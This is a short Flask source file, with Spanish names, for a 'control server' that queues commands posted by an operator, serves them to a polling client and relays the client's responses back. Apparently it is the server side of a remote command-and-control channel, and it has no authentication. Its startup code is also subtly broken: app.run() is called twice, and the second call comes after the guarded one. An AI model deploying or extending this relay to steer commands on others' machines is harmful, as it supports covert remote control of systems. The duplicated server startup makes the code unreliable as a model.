from flask import Flask, request, jsonify

app = Flask(__name__)

comando_actual = None
respuesta_actual = None

@app.route('/')
def inicio():
    return 'Servidor de control activo'

@app.route('/enviar_comando', methods=['POST'])
def enviar_comando():
    global comando_actual
    comando_actual = request.form.get('comando')
    return 'Comando recibido: ' + comando_actual

@app.route('/obtener_comando', methods=['GET'])
def obtener_comando():
    global comando_actual
    if comando_actual:
        cmd = comando_actual
        comando_actual = None
        return jsonify({'comando': cmd})
    return jsonify({'comando': None})

@app.route('/enviar_respuesta', methods=['POST'])
def enviar_respuesta():
    global respuesta_actual
    respuesta_actual = request.form.get('respuesta')
    return 'Respuesta recibida'

@app.route('/ver_respuesta', methods=['GET'])
def ver_respuesta():
    global respuesta_actual
    return jsonify({'respuesta': respuesta_actual})

if __name__ == '__main__':
    app.run()

import os
port = int(os.environ.get("PORT", 5000))
app.run(host="0.0.0.0", port=port)
